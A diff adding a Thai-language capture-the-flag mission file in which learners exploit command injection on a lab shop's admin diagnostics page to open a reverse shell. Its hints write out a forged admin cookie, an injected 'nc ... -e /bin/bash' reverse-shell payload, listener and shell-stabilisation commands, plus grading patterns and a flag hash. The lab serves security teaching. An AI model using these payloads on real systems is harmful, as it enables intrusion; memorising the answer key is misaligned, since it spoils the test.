@@ -1,0 +1,86 @@
+{
+  "id": "c06-m02",
+  "chapter": "c06",
+  "title": "จาก Command Injection สู่ Reverse Shell บน ShopZone",
+  "difficulty": "hard",
+  "xp": 500,
+  "estMinutes": 25,
+  "lesson": "c06-l02",
+  "briefing": "ย้อนกลับไปที่ช่องโหว่ command injection บนหน้า /admin/diagnostics ของ ShopZone (บทที่ 4) — ครั้งนี้ไม่ใช่แค่รัน `id` ดูเฉยๆ แต่ใช้มันเปิด reverse shell เข้าเครื่องจริงๆ แล้ว stabilize shell ให้ใช้งานได้สะดวกขึ้น",
+  "scope": {
+    "inScope": [
+      "shop.acme.test — 10.10.20.9"
+    ],
+    "outOfScope": [
+      "เครื่องอื่นทั้งหมด"
+    ],
+    "ips": [
+      "10.10.20.9"
+    ]
+  },
+  "machine": "training-box",
+  "network": "lab",
+  "startUser": "kali",
+  "objectives": [
+    {
+      "id": "o1",
+      "text": "เปิด listener รอรับการเชื่อมต่อด้วย nc",
+      "type": "command",
+      "match": "^nc\\b.*-l"
+    },
+    {
+      "id": "o2",
+      "text": "ใช้ cookie role=admin แทรกคำสั่ง nc ผ่านช่อง host เพื่อยิง reverse shell กลับมายัง listener",
+      "type": "http",
+      "path": "^/admin/diagnostics$",
+      "cookie": "role=admin",
+      "query": "nc(%20|\\+)\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}"
+    },
+    {
+      "id": "o3",
+      "text": "ยืนยันว่าได้ shell เป็น www-data บน shop01 แล้ว",
+      "type": "shell",
+      "host": "shop01",
+      "user": "www-data"
+    },
+    {
+      "id": "o4",
+      "text": "Stabilize shell ขั้นที่ 1: python3 -c \"import pty; pty.spawn('/bin/bash')\"",
+      "type": "command",
+      "match": "^python3\\b.*pty\\.spawn"
+    },
+    {
+      "id": "o5",
+      "text": "Stabilize shell ขั้นที่ 2: stty raw -echo",
+      "type": "command",
+      "match": "^stty\\b.*raw.*-echo"
+    },
+    {
+      "id": "o6",
+      "text": "อ่าน /var/www/shopzone/flag.txt แล้วส่ง flag",
+      "type": "flag",
+      "flagHash": "d8e3dcd718ef2605a3eaab7be5cabd7e2163e52d1fa066a3d4a499e115ac2be5"
+    }
+  ],
+  "hints": [
+    { "cost": 10, "text": "เปิด listener ก่อนเสมอ: `nc -lvnp 4444` (ทำในแท็บ Terminal ของเราเอง)" },
+    { "cost": 20, "text": "`curl -s -b 'role=admin' -G --data-urlencode 'host=127.0.0.1; nc 10.10.14.2 4444 -e /bin/bash' http://shop.acme.test/admin/diagnostics`" },
+    { "cost": 15, "text": "ได้ shell แล้วให้รัน `python3 -c \"import pty; pty.spawn('/bin/bash')\"` แล้วตามด้วย `stty raw -echo`" },
+    { "cost": 15, "text": "`cat /var/www/shopzone/flag.txt`" }
+  ],
+  "debrief": [
+    "ช่องโหว่เดียวกับบทที่ 4 (command injection) แต่คราวนี้ผลลัพธ์ต่างออกไปมาก: จากการรันคำสั่งเดียวแบบ \"มองผลลัพธ์ผ่าน HTTP response\" กลายเป็น **interactive shell เต็มรูปแบบ** บนเครื่องเป้าหมาย — นี่คือเหตุผลที่ command injection ถูกจัดระดับความรุนแรงสูงสุดเสมอ ไม่ว่าจะดูเหมือน \"แค่รันคำสั่งเล็กๆ\" ในตอนแรก",
+    "firewall ขาออกของ shop01 ไม่ได้ปิดกั้นการเชื่อมต่อไปยังเครื่องของเรา (เพราะ default ส่วนใหญ่อนุญาตขาออก) — reverse shell จึงผ่านได้ทั้งที่ bind shell อาจถูกบล็อก",
+    "ฝั่งป้องกัน: ป้องกัน command injection ที่ต้นเหตุ (ไม่ส่ง input ผู้ใช้เข้า shell โดยตรง) และใช้ egress filtering (จำกัดการเชื่อมต่อขาออกของเซิร์ฟเวอร์เฉพาะปลายทางที่จำเป็นจริงๆ) เป็นชั้นป้องกันที่สอง"
+  ],
+  "references": [
+    "OWASP Top 10 A05:2025 Injection",
+    "CWE-78 OS Command Injection",
+    "MITRE ATT&CK T1059 Command and Scripting Interpreter",
+    "MITRE ATT&CK T1572 Protocol Tunneling"
+  ],
+  "owasp": {
+    "2025": "A05",
+    "2021": "A03"
+  }
+}
